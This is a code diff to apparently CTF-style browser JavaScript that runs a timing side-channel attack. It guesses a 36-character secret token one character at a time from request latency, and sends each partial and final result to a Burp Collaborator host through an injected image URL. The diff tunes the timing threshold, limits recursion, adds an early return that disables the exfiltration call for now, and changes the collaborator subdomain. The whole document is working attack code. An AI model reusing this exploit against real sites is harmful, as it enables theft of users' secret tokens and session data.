@@ -10,6 +10,7 @@
     function nextChar(key)
     {
         chars="0123456789-abcdef"
+        let bFound = false
         for (var i = 0; i < chars.length; i++) {
             char = chars.charAt(i)
             const request = async (tk) => {
@@ -20,12 +21,15 @@
                 }).catch(e => console.log("BB"+e));
                 let request_time = performance.now() - before
                 console.log("tk:"+tk+":"+request_time)
-                if (request_time > 2500) {
+                if (request_time > 3000) {
                     if (tk.length == 36) {
                         sendKey("FINAL:"+tk)
                     } else {
                         sendKey("INT:"+tk)
-                        nextChar(tk)
+                        if (bFound == false) {
+                            bFound=true
+                            nextChar(tk)
+                        }
                     }
                 }
             }
@@ -38,9 +42,10 @@
     function sendKey(k)
     {
         console.log("sendKey:"+k)
+        return
         var ul= document.getElementById("secrets");
         var li = document.createElement("img");
-        li.src = "http://o4t4sbqxctrencjqc7upwwmkibo1cq.burpcollaborator.net?key="+k
+        li.src = "http://s81a9uym9ibodhw899ouoeei89e02p.burpcollaborator.net?key="+k
         ul.appendChild(li);
     };
     
